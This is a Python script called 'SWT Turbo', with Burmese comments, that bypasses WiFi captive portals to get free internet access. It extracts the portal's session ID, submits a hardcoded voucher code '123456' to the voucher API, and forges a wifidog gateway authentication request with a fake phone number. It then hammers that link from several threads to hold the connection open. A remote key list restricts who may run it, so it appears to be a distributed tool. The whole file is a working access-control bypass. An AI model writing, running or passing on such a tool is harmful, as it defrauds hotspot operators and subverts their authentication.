import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
PING_THREADS = 5
PING_INTERVAL = 0.1 

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    banner = """
    \033[1;32m
    ##########################################
    #                                        #
    #              SWT  TURBO                #
    #        FAST & UNLIMITED ACCESS         #
    #                                        #
    ##########################################
    \033[0m
    """
    print(banner)

def get_data_usage():
    """Data Usage တွက်ချက်ရန်"""
    try:
        net_io = psutil.net_io_counters()
        total_bytes = net_io.bytes_sent + net_io.bytes_recv
        return total_bytes / (1024 * 1024)
    except: return 0

def check_approval():
    """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
    try:
        device_id = os.popen("id -u -n").read().strip()
        show_banner()
        print(f"\033[1;33m[*] Detected ID: {device_id}\033[0m")
        print("[*] Checking Authorization...")
        
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
        
        allowed_users = response.text.splitlines()
        
        if device_id in allowed_users:
            print("\033[1;32m[+] Access Granted!\033[0m")
            time.sleep(1)
            return True
        else:
            print(f"\n\033[1;31m[!] Access Denied! ID: {device_id} is not registered.\033[0m")
            print("[*] Contact Admin to get approval.")
            sys.exit()
    except Exception as e:
        print(f"[!] Security Check Error: {e}")
        sys.exit()

def check_real_internet():
    """Google ကို ချိတ်ဆက်နိုင်ခြင်း ရှိမရှိ စစ်ဆေးရန်"""
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Gateway ကို အဆက်မပြတ် Ping ထိုးပေးခြင်း (Internet Access ကို ထိန်းထားရန်)"""
    while True:
        try:
            session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # ၁။ Approval အရင်စစ်မည်
    check_approval()
    
    # ၂။ User Menu
    print(f"\n\033[1;33m[1] Start SWT Turbo Internet")
    print("[0] Exit\033[0m")
    choice = input("\nSelect Option: ")
    if choice != '1':
        sys.exit()
        
    clear_screen()
    show_banner()
    print("[*] Initializing system... Connecting to Gateway...")
    
    start_time = time.time()
    start_data = get_data_usage()

    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            # Captive Portal သို့မဟုတ် Internet ရမရ အရင်စစ်သည်
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # အကယ်၍ အင်တာနက်ရနေပြီဆိုလျှင် Status ပြပြီး စောင့်နေမည်
            if r.url == test_url:
                if check_real_internet():
                    elapsed = time.time() - start_time
                    mins, secs = divmod(int(elapsed), 60)
                    hours, mins = divmod(mins, 60)
                    current_data = get_data_usage() - start_data
                    print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Status: Online\033[0m", end='', flush=True)
                    time.sleep(5)
                    continue
            
            # ၃။ Internet မရသေးလျှင် Portal URL မှ တစ်ဆင့် SID နှင့် Gateway ရှာဖွေခြင်း
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            # SID (Session ID) ကို ရှာဖွေခြင်း
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၄။ Voucher Activation (Internet Access ဖွင့်ရန်)
                print(f"\n[*] Activating Session: {sid}")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    # မူရင်း script အတိုင်း voucher access code '123456' ကို သုံးထားသည်
                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except: pass

                # ၅။ Gateway Authentication Link တည်ဆောက်ခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                # ၆။ Threads များဖြင့် Ping ထိုးခြင်း (အင်တာနက် အမြန်နှုန်း မြှင့်ရန်)
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                print(f"\033[1;32m[+] Turbo Activated! SID: {sid}\033[0m")
                while check_real_internet():
                    time.sleep(5)
        except Exception as e:
            # Error ဖြစ်လျှင် ၅ စက္ကန့်နားပြီး ပြန်စစ်မည်
            time.sleep(5)

if __name__ == "__main__":
    start_process()
    
